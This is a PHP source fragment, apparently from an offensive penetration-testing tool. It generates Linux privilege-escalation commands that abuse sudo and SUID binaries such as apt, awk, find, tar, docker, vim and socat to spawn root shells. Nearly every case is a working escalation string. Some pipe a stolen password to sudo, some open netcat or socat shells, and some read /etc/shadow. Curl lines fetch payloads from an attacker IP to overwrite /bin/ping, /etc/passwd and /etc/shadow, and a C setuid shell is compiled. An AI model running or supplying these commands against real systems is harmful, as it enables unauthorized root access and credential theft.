	    $attacker_ip = $this->ip4addr4target($target_ip);
	    $cmd = trim($cmd);

	    
	    $via_sudo = "echo '$userpass' | sudo -S ";
	    $via_suid = "/bin/bash -p";
	    $data = "";
	    $data_sudo = "";
	    $data_rst = "";
	    $sha1_hash = sha1($cmd);
	    
	        switch ($this->file_name){
	            
	            case "apt":
	            case "apt-get":
	                $data = "$this->file_path update -o APT::Update::Pre-Invoke::=\"$via_suid -c $cmd \"";
	                $data_sudo = "$via_sudo $data";
	                	                
	                break ;
	                
	            case "aria2c":
	                $data = "COMMAND=\"$cmd\" && TF=\$(mktemp) && echo \"\$COMMAND\" > \$TF && chmod +x \$TF && $this->file_path --on-download-error=\$TF http://x ";
	                $data_sudo = "COMMAND=\"$via_suid -c $cmd\" && TF=\$(mktemp) && echo \"\$COMMAND\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path --on-download-error=\$TF http://x ";
	                
	                break ;
	                

	                
	            case "ash": // OK lin.Security
	                $data = "$this->file_path -c \"$cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                

	            case "awk": // OK lin.Security
	                $data = "$this->file_path \"BEGIN {system(\\\"$via_suid -c $cmd\\\")}\"";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                

	            case "bash": // OK lin.Security
	                $data = "$this->file_path -c \"$cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "busybox":
	                $data = "$this->file_path telnetd - | $via_suid -c $cmd";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "chsh":
	                $data = "$this->file_path -s $via_suid -c $cmd ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "cpan":
	                $data = "$this->file_path -e \"! \\\"$via_suid -c $cmd\\\"\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "cpulimit":
	                $data = "cpulimit -l 100 -f \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "crontab":
	                $data = "$this->file_path -e \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "csh": // OK lin.Security
	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                
	                /*
	            case "curl": // OK id hand + No rev lin.Security
	                
	                $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
system("/bin/bash -p -c $cmd");
return 0;
}
EOC;
	 
	                $seteuid = <<<EOC
#include <stdio.h>
int main(void){
setuid(0);
setgid(0);
seteuid(0);
setegid(0);
execvp("/bin/sh", NULL, NULL);
}
EOC;
	                
	                
	                $sha1_cmd = sha1($seteuid);
	                $file_path = "/tmp/$sha1_cmd.c";
	                $this->str2file($seteuid, $file_path);

	                $query = "gcc -m32 -o $this->dir_tmp/$sha1_cmd $file_path && chmod 777 $this->dir_tmp/$sha1_cmd ";
	                $this->requette($query);
                    $query = "echo \"$via_suid -c $cmd\" > $this->dir_tmp/$sha1_cmd.sh  ";
                    $query = "echo \"sudo $via_suid -c id\" > $this->dir_tmp/$sha1_cmd.sh  ";
                    $this->requette($query);

	                $attacker_ip = $this->ip4addr4target($this->ip);
                    $this->tcp2open4server($attacker_ip, $this->port_rfi);
	               
	                //$data = "($this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) | /bin/bash ";
	                //$data_sudo = "($via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) | /bin/bash > /tmp/rst3.txt ; cat /tmp/rst3.txt";	                
	                //$data_sudo = "bash -p <($via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) > /tmp/rst.txt ; cat /tmp/rst.txt ";
	                //$data_sudo = "$via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh | /bin/bash 0<&2 1>&2 ";
	                $data_sudo = "$via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd -o /bin/ping ; ping ";
	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\"; sleep 2; echo \"$cmd\";  sleep 2; echo \"ping\"; sleep 20 ) | socat - EXEC:\"sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd -o /bin/ping ; ping\",pty,stderr,setsid,sigint,ctty,sane";
	                // sudo curl -s http://192.168.1.38/passwd -o /etc/passwd
	                //sudo curl -s http://192.168.1.38/seuid -o /bin/ping
	                //sudo curl -s http://192.168.1.38/shadow -o /etc/shadow
	                break ;
	                */
                        
	                
	            case "dash": // OK lin.Security
	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
                    
	            
	            case "dmesg":
	                $data = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\"; ) | socat - EXEC:\"dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\";  sleep 30 ) | socat - EXEC:\"sudo dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break ;
	            case "dmsetup":
	                $data = "$this->file_path ls --exec \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "dnf":
	                $data = "  \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "docker":
	                $data = "$this->file_path run -v /:/mnt --rm -it alpine chroot /mnt sh -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "dpkg":
	                $data = " \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "easy_install":
	                $data = "TF=\$(mktemp -d) && echo \"import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p -c\\\", \\\"$cmd <$(tty) >$(tty) 2>$(tty)\\\")\" > \$TF/setup.py && easy_install \$TF  ";
	                $data_sudo = "TF=\$(mktemp -d) && echo \"import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p -c\\\", \\\"$cmd <$(tty) >$(tty) 2>$(tty)\\\")\" > \$TF/setup.py && $sudo easy_install \$TF  ";
	                break;
	                
	                
	            case "ed": // OK lin.Security
	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 30 ) | socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
	                
	                break;
	                
	            case "emacs":
	                $data = "$this->file_path -Q -nw --eval \"(term \\\"$cmd\\\")\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "env": // OK lin.Security
	                $data = "$this->file_path $cmd ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
                        

	            case "exec": // 
	                $data = "$this->file_path $cmd ";
	                $data_sudo = "$via_sudo $data";
	                break ;
	                
	                
	            case "expect": // OK lin.Security
	                $data = "(sleep 15; echo \"$via_suid -c $cmd\"; ) | socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\";  sleep 30 ) | socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name -i<<# >/dev/null 2>&1\n$via_suid -c $cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name -i<<# >/dev/null 2>&1\n$userpass\n$via_suid -c $cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	            case "facter":
	                $data = "TF=\$(mktemp -d) && echo \"exec(\\\"$cmd\\\")\" > \$TF/x.rb && FACTERLIB=\$TF && facter  ";
	                $data_sudo = "TF=\$(mktemp -d) && echo \"exec(\\\"$cmd\\\")\" > \$TF/x.rb && FACTERLIB=\$TF && $sudo -E facter  ";
	                break;
	                
                    
	            case "find": // OK lin.Security
	                $data = "$this->file_path /etc/shadow -type f -exec $cmd \; ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "finger":
	                $data = " \"$via_suid -c $cmd\" ";
	                break;
	                
	            case "flock":
	                $data = "$this->file_path -u / $cmd ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;

	                
	            case "ftp": // OK lin.Security 
	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"ftp\",pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15; echo \"$userpass\" ; sleep 2;echo \"! $cmd\"; sleep 30) | socat - EXEC:\"sudo ftp\",pty,stderr,setsid,sigint,ctty,sane";	                
	                $data_sudo = "echo \"! $cmd\"| sudo ftp";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	                
	            case "gdb":
	                $data = "$this->file_path --batch -q -ex \"! $via_suid -c $cmd\" -ex \"quit\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "gimp":
	                $data = "$this->file_path -idf --batch-interpreter=python-fu-eval -b \"import os; os.system(\\\"$via_suid -c $cmd\\\")\"  ";
	                $data_sudo = "$via_sudo $data";
	                break ;
	                
	                
	            case "git": // OK id + No rev Lin.Security
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\"; sleep 30;) | socat - EXEC:\"sudo git help status\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name help status<<# >/dev/null 2>&1\n! $via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name help status<<# >/dev/null 2>&1\n$userpass\n!$ via_suid\n$cmd\n#\" | sh  ";
	                
	                // git -p help\n!/bin/sh
	                break;
	                
	                
	                

	            case "ionice":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                break ;

	            case "irb":
	                $data = "$this->file_path
exec \"/bin/bash\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "jjs":
	                $data_sudo = "echo \"Java.type(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"$via_suid  -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\\\").waitFor()\" | $sudo jjs ";
	                break;
	                
	            case "journalctl":
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n!$via_suid\n$cmd\n#\" | sh ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\"  | sh ";
	                
	                break;
	                

	            case "jrunscript":
	                $data = "$this->file_path -e \"exec(\\\"$via_suid -c $cmd\\\")\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "ksh":
	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                
	            case "ldconfig":
	                $data = "/lib/ld.so \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "ld.so":
	                // https://gtfobins.github.io/gtfobins/ldconfig
	                $data_sudo = " \"$via_suid -c $cmd\" ";
	                break;
	                
	            case "less": // OK lin.Security
	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"$this->file_path /etc/passwd\",pty,stderr,setsid,sigint,ctty,sane";	                
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	            case "logsave":
	                $data = "$this->file_path /dev/null \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "ltrace":
	                $data = "$this->file_path -b -L \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "lua":
	                $data = "$this->file_path -e \"os.execute(\\\"$via_suid -c $cmd\\\")\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "mail":
	                $data = "mail --exec=\\\"! $via_suid -c $cmd\\\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "make":
	                $data = "$this->file_path -s --eval=\$'x:\n\t-''$cmd' ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                
	            case "man": //  OK id + No rev Lin.Security
	                $data = "(sleep 15; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"$this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"sudo $this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	                
	                
	                
	            case "more": // OK lin.Security
	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	            case "mount":
	                $data = "$this->file_path -o bind $via_suid /bin/mount && /bin/mount $cmd ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;

	            case "mv":
	                $data_sudo = " \"$via_suid -c $cmd\" ";
	                break;
	                
	            case "mysql":
	                $data = "$this->file_path -e \"\! $via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "nano":
	                $data = "$this->file_path
^R^X
reset; sh \"$via_suid -c $cmd\" 1>&0 2>&0  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "nc":
	            case "nc.traditional":
	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "ncat":
	                /*
	                 ncat --exec cmd.exe --allow [alice] -vnl 443 --ssl
	                 ncat -v [bob] 443 --ssl
	                 */
	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "nice":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                

	            case "nmap":
	                $data = "TF=\$(mktemp) && echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > \$TF && $sudo nmap --script=\$TF ";
	                $data = "$this->file_path --script <(echo \"os.execute(\\\"$via_suid -c $cmd\\\")\")";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "node":
	                $data = "$this->file_path -e \"require(\\\"child_process\\\").spawn(\\\"$via_suid \\\", {stdio: [0, 1, 2]});\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;

	            case "openssl":
	                $data = "  \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                
	            case "perl":  // OK lin.Security
	                $data = "$this->file_path -e \"exec \\\"$via_suid -c $cmd\\\";\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
                    
	                
	            case "php":
	                $data = "$this->file_path -r \"system(\\\"$via_suid -c $cmd\\\");\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "pic":
	                $data = "$this->file_path -U
.PS
sh X sh X $cmd ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                 
	            case "pico": // No Lin.Security 
	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo -e '\\x18'; sleep 2;echo -e '\\x24'; sleep 2;echo \"reset; sh -c $cmd 1>&0 2>&0\"; sleep 2; echo -e '\\x24'; sleep 2; echo -e 'N\\n';) | socat - EXEC:\"sudo pico /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid $cmd \"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid $cmd 1>&0 2>&0\"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	            case "pip":
	                $data = "TF=\$(mktemp -d) && echo \"import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p -c\\\", \\\"$cmd <$(tty) >$(tty) 2>$(tty)\\\")\" > \$TF/setup.py && pip install \$TF  ";
	                $data_sudo = "TF=\$(mktemp -d) && echo \"import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p -c\\\", \\\"$cmd <$(tty) >$(tty) 2>$(tty)\\\")\" > \$TF/setup.py && $sudo pip install \$TF  ";
	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
	                //$data_sudo = "$via_sudo $data";
	                break;
	                
	            case "puppet":
	                $data = "$this->file_path apply -e \"exec {\\\"$via_suid  -c \"exec sh -i $cmd <$(tty) >$(tty) 2>$(tty)\\\": }\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;

	                
	            case "python3":
	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
	                $data_sudo = "$via_sudo $data";
	                break ;
	                
	            case "python":
	                $data = "$this->file_path -c \"import os; os.system(\\\"$via_suid -c $cmd\\\")\"  ";
	                $data_sudo = "$via_sudo $data";
	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
	                //$data_sudo = "$via_sudo $data";
	                break ;
	                
	            case "red":
	                $data_sudo = " \"$via_suid -c $cmd\" ";
	                break;
	                
	            case "rlogin":
	                $data_sudo = " \"$via_suid -c $cmd\" ";
	                break;
	                
	            case "rlwrap":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "rpm":
	                $data = "$this->file_path --eval \"%{lua:os.execute(\\\"$via_suid -c $cmd\\\")}\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "rpmquery":
	                $data = "$this->file_path --eval \"%{lua:posix.exec(\\\"$via_suid -c $cmd\\\")}\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	            case "rsync":
	                $data = "$this->file_path -e \"sh -c \\\"$via_suid -c $cmd 0<&2 1>&2\\\"\" 127.0.0.1:/dev/null";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "ruby":
	                $data = "$this->file_path -e \"exec \\\"$via_suid -c $cmd\\\"\"  ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                

	            case "run-parts":
	                $data = "$this->file_path --new-session --regex '^sh$' /bin ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	                
	                
	            case "rvim": // OK lin.Security 
	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
	                $data_sudo = "$via_sudo $data";
	                break ;
	                
	                

                    
	            case "scp": // OK lin.Security
	                //$data_sudo = "TF=\$(mktemp) && echo \"$cmd 0<&2 1>&2\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -S \$TF x y: 0<&2 1>&2 ";
	                $data_sudo = "echo \"$via_suid -c $cmd > /tmp/rst.txt \" > $this->vm_tmp_lin/$sha1_hash.sh && chmod +x $this->vm_tmp_lin/$sha1_hash.sh ; $via_sudo $this->file_path -S $this->vm_tmp_lin/$sha1_hash.sh x y: ; cat /tmp/rst.txt "; // OK
	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c $cmd\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	                
	            case "screen":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "script": // OK lin.Security
	                $data = "$this->file_path -q /dev/null -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "sed":
	                $data = "$this->file_path -n \"1e exec $via_suid -c $cmd 1>&0\" /etc/hosts ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "service":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "setarch":
	                $data = "setarch \$(arch) \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                
	                break ;
	            case "sftp":
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	            case "sh": // OK lin.Security
	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                

	            case "smbclient":
	                $attacker_ip = $this->ip4addr4target($this->ip);
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\";; sleep 30 ) | socat - EXEC:\"$this->file_path \\\"\\$attacker_ip\share\\\"\",pty,stderr,setsid,sigint,ctty,sane";
	                $note = "$this->file_path '\\$attacker_ip\share'
!$via_suid  -c  $cmd ";
	                $this->note($note);
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	                
	            case "socat": // OK lin.Security
	                // OK // (sleep 2; echo "id"; sleep 2; echo "wget http://10.60.10.1:8085/test.html"; sleep 2;) | socat - EXEC:"sh",pty,stderr,setsid,sigint,ctty,sane // OK
	                // https://gist.github.com/mario21ic/c09f0a648130ad6a91abdde41cb011c8
	                // (sleep 2; echo PASSWORD; sleep 2; echo ls; sleep 2) | socat - EXEC:'ssh -l user server',pty,stderr,setsid,sigint,ctty,sane
	                //$data = "socat tcp-connect:\$RHOST:\$RPORT exec:$cmd,pty,stderr,setsid,sigint,sane  ";
	                // socat TCP4-LISTEN:1234,reuseaddr EXEC:/bin/sh
	                // sudo socat exec:'sh –li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234

	                
	                $data_sudo = "echo \"$userpass\" | sudo -S $this->file_path - exec:$cmd,pty,stderr,setsid,sigint,ctty,crnl,raw,sane,echo=0"; // tcp-connect:$attacker_ip:$attacker_port
	                //"echo \"$userpass\" | sudo -S socat exec:'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.60.10.1:1234"
	                break ;
	                 

	            case "sqlite3":
	                $data = "$this->file_path /dev/null '.shell $via_suid -c $cmd' ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "ssh":  // OK lin.Security
	                $cmd = trim($cmd);
	                // ssh user@host bash -c "echo mypass | sudo -S mycommand"
	                // ssh -o ProxyCommand=';sh 0<&2 1>&2' x
	                // ssh localhost $cmd --noprofile --norc
	                $data = "$this->file_path -o ProxyCommand=\";$via_suid -c $cmd 0<&2 1>&2\" x 2>&1 | grep uid ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "start-stop-daemon":
	                $data = "$this->file_path -n \$RANDOM -S -x \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "stdbuf":
	                $data = "$this->file_path -i0 \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "strace":  // OK PumpkinRaising
	                $data = "$this->file_path -o /dev/null \"$cmd\" ";
	                $data_sudo = "$via_sudo $data";
	                break ;
	                
	            case "stty" :
	                /*
	                 * – stty options:
	                 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
	                 https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
	                 https://guide.offsecnewbie.com/privilege-escalation/linux-pe
	                 */
	                $data = "";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "su":
	                $data = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'$this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
	                $data_sudo = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'sudo $this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
	                
	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	            case "systemctl":
	                $cmd = trim($cmd);
	                /*
	                 TF=$(mktemp)
	                 echo /bin/sh >$TF
	                 chmod +x $TF
	                 sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
	                 */
	                $data = " \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;

	                
	            case "tar":
	                // tar xf /dev/null -I '$via_suid  -c "sh <&2 1>&2"'
	                $data = "$this->file_path -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "taskset":
	                $data = "$this->file_path 1 $via_suid -c $cmd ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "tclsh":// OK lin.Security
	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\"; sleep 30 ) | socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
	                
